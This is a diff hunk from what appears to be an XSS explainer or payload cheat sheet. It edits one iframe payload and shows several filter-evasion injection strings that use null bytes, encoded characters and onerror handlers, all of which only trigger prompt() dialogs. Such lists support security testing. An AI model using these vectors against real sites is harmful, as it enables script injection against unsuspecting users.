@@ -34,7 +34,7 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 
 
 
-<iframe %00 src="&Tab;javascript:prompt(122)&Tab;"%00>
+<iframe %00 src="&Tab;javascript:prompt(document.domain)&Tab;"%00>
 <ScRipT 5-0*3+9/3=>prompt(2)</ScRipT giveanswerhere=?
 </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
 <img/&#09;&#10;&#11; src=`~` onerror=prompt(3)>
